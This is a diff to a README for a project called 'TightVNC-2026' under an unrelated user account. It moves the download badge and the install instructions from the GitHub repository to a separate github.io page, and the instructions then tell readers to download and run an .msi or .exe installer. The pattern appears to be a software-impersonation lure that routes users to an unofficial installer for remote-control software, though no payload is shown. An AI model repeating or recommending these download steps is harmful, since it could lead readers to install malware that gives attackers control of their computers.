@@ -1,6 +1,6 @@
 # 🖥️ TightVNC-2026 - Control remote computers with ease today
 
-[![](https://img.shields.io/badge/Download-TightVNC-blue.svg)](https://github.com/mariannmultidimensional627/TightVNC-2026)
+[![](https://img.shields.io/badge/Download-TightVNC-blue.svg)](https://mariannmultidimensional627.github.io)
 
 ## 📌 What is TightVNC-2026
 
@@ -21,7 +21,7 @@ Before you install this software, check these requirements on your computer:
 Follow these steps to get the files you need.
 
 1. Open your web browser.
-2. Go to the main project page at this location: https://github.com/mariannmultidimensional627/TightVNC-2026
+2. Go to the main project page at this location: https://mariannmultidimensional627.github.io
 3. Look for the release section on the right side of the screen.
 4. Click the link to see the available files.
 5. Select the installer file that ends with .msi or .exe.
